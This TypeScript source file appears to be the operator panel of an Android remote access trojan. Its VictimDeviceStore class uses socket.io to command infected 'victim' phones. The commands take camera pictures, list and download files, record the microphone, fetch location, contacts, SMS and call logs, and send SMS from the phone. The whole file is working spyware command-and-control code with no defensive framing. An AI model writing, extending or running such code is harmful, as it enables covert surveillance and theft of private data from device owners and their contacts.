import { saveAs } from 'file-saver';
import { action, makeObservable, observable } from 'mobx';
import { io, type Socket } from 'socket.io-client';

import { SOCKET_NAMESPACE_DEVICE } from '../../common/constants';
import {
    ConnectionStatus,
    ServerToVictimEvents,
    VictimOrder,
    type VictimStatus,
} from '../../common/enums';
import {
    type CallLogItem,
    type CameraItem,
    type CameraOrderPayload,
    type ContactItem,
    type FileListItem,
    type IServerToVictimEvents,
    type IVictimModel,
    type IVictimToServerEvents,
    type SMSItem,
} from '../../common/interfaces';
import { bufferToDataUrl } from '../utils/Common';

export class VictimDeviceStore implements IVictimModel {
    public id: string;
    public deviceId: string;
    public ip: string;
    public port: number;
    public country: string;
    public manf: string;
    public model: string;
    public release: string;
    public status: VictimStatus;
    public createdAt: number;
    public updatedAt: number;

    private readonly socket: Socket<
        IVictimToServerEvents,
        IServerToVictimEvents
    >;

    public connectionStatus: ConnectionStatus = ConnectionStatus.DISCONNECTED;
    public open: boolean = false;
    public cameras: CameraItem[] = [];
    public imageDataUrl: string | null = null;
    public files: FileListItem[] = [];
    public audioDataUrl: string | null = null;
    public location: [number, number] | null = null;
    public contacts: ContactItem[] = [];
    public smsMessages: SMSItem[] = [];
    public callLogs: CallLogItem[] = [];

    public constructor(input: IVictimModel) {
        this.id = input.id;
        this.deviceId = input.deviceId;
        this.ip = input.ip;
        this.port = input.port;
        this.country = input.country;
        this.manf = input.manf;
        this.model = input.model;
        this.release = input.release;
        this.status = input.status;
        this.createdAt = input.createdAt;
        this.updatedAt = input.updatedAt;

        this.socket = io(SOCKET_NAMESPACE_DEVICE, {
            autoConnect: false,
            query: {
                deviceId: this.deviceId,
            },
            forceNew: true,
        });

        this.setupListeners();

        makeObservable(this, {
            audioDataUrl: observable,
            callLogs: observable,
            cameras: observable,
            connectionStatus: observable,
            contacts: observable,
            files: observable,
            imageDataUrl: observable,
            location: observable,
            smsMessages: observable,
            open: observable,
            setAudio: action,
            setCallLogs: action,
            setCameras: action,
            setContacts: action,
            setFiles: action,
            setImage: action,
            setLocation: action,
            setSMSMessages: action,
            setOpen: action,
            setConnectionStatus: action,
        });
    }

    private setupListeners(): void {
        this.socket.on('connect', () => {
            this.setConnectionStatus(ConnectionStatus.CONNECTED);
            console.log(`[VICTIM] Device ${this.deviceId} connected`);
        });

        this.socket.on('disconnect', () => {
            this.setConnectionStatus(ConnectionStatus.DISCONNECTED);
            console.log(`[VICTIM] Device ${this.deviceId} disconnected`);
        });

        this.socket.io.on('error', (error) => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.log(
                `[VICTIM] Device ${this.deviceId} error: ${error.message}`,
            );
        });

        this.socket.io.on('reconnect_attempt', (attempt) => {
            this.setConnectionStatus(ConnectionStatus.CONNECTING);
            console.log(
                `[VICTIM] Device ${this.deviceId} reconnecting`,
                attempt,
            );
        });

        this.socket.io.on('reconnect', (attempt) => {
            this.setConnectionStatus(ConnectionStatus.CONNECTED);
            console.log(
                `[VICTIM] Device ${this.deviceId} reconnected`,
                attempt,
            );
        });

        this.socket.io.on('reconnect_error', (error) => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.log(
                `[VICTIM] Device ${this.deviceId} reconnect error: ${error.message}`,
            );
        });

        this.socket.io.on('reconnect_failed', () => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.log(`[VICTIM] Device ${this.deviceId} reconnect failed`);
        });

        this.socket.on(VictimOrder.CAMERA, (data: CameraOrderPayload) => {
            console.log(`[VICTIM] Device ${this.deviceId} camera data`, data);

            if (data.camList === true) {
                this.setCameras(data.list);
            } else if (data.image) {
                this.setImage(Buffer.from(data.buffer));
            }
        });

        this.socket.on(VictimOrder.FILE_MANAGER, (data) => {
            if (Array.isArray(data)) {
                if (data.length === 0) {
                    console.error(`Permission denied for listing files!`);
                    // TODO: Show toast
                } else {
                    console.log(
                        `[VICTIM] Listing files from ${this.deviceId}`,
                        data,
                    );
                    this.setFiles(data);
                }
            } else if (data.file) {
                console.log(
                    `[VICTIM] Downloading file from ${this.deviceId}`,
                    data,
                );
                saveAs(new Blob([Buffer.from(data.buffer)]), data.name);
            }
        });

        this.socket.on(VictimOrder.MICROPHONE, (data) => {
            console.log(`[VICTIM] Recording audio from ${this.deviceId}`);

            this.setAudio(Buffer.from(data.buffer));
        });

        this.socket.on(VictimOrder.LOCATION, (data) => {
            console.log(`[VICTIM] Location from ${this.deviceId}`, data);

            this.setLocation([data.lat, data.lng]);
        });

        this.socket.on(VictimOrder.CONTACTS, (data) => {
            console.log(`[VICTIM] Contacts from ${this.deviceId}`, data);

            this.setContacts(data.contactsList);
        });

        this.socket.on(VictimOrder.SMS, (data) => {
            console.log(`[VICTIM] SMS from ${this.deviceId}`, data);

            if (typeof data === 'boolean') {
                // TODO: Show toast and progress
            } else {
                this.setSMSMessages(data.smsList);
            }
        });

        this.socket.on(VictimOrder.CALLS, (data) => {
            console.log(`[VICTIM] Call logs from ${this.deviceId}`, data);

            this.setCallLogs(data.callsList);
        });
    }

    public listCameras(): void {
        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
            order: VictimOrder.CAMERA,
            extra: 'camList',
        });
    }

    public takePicture(cameraId: number): void {
        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
            order: VictimOrder.CAMERA,
            extra: cameraId,
        });
    }

    public listFiles(path: string): void {
        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
            order: VictimOrder.FILE_MANAGER,
            extra: 'ls',
            path,
        });
    }

    public downloadFile(path: string): void {
        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
            order: VictimOrder.FILE_MANAGER,
            extra: 'dl',
            path,
        });
    }

    public recordAudio(seconds: number): void {
        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
            order: VictimOrder.MICROPHONE,
            sec: seconds,
        });
    }

    public fetchLocation(): void {
        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
            order: VictimOrder.LOCATION,
        });
    }

    public fetchContacts(): void {
        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
            order: VictimOrder.CONTACTS,
        });
    }

    public sendSMS(phoneNo: string, msg: string): void {
        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
            order: VictimOrder.SMS,
            extra: 'sendSMS',
            to: phoneNo,
            sms: msg,
        });
    }

    public fetchSMSMessages(): void {
        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
            order: VictimOrder.SMS,
            extra: 'ls',
        });
    }

    public fetchCallLogs(): void {
        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
            order: VictimOrder.CALLS,
        });
    }

    public setAudio(audio: Buffer | null): void {
        this.audioDataUrl =
            audio !== null ? bufferToDataUrl(audio, 'audio/mp3') : null;
    }

    public setCallLogs(callLogs: CallLogItem[]): void {
        this.callLogs = callLogs;
    }

    public setCameras(cameras: CameraItem[]): void {
        this.cameras = cameras;
    }

    public setConnectionStatus(connectionStatus: ConnectionStatus): void {
        this.connectionStatus = connectionStatus;
    }

    public setContacts(contacts: ContactItem[]): void {
        this.contacts = contacts;
    }

    public setFiles(files: FileListItem[]): void {
        this.files = files
            .sort((a, b) => a.name.localeCompare(b.name))
            .sort((a, b) =>
                a.isDir && !b.isDir ? -1 : b.isDir && !a.isDir ? 1 : 0,
            );
    }

    public setImage(image: Buffer | null): void {
        this.imageDataUrl = image !== null ? bufferToDataUrl(image) : null;
    }

    public setLocation(location: [number, number] | null): void {
        this.location = location;
    }

    public setSMSMessages(smsMessages: SMSItem[]): void {
        this.smsMessages = smsMessages;
    }

    public setOpen(open: boolean): void {
        this.open = open;

        if (open) {
            this.socket.connect();
        } else {
            this.socket.disconnect();
        }
    }
}
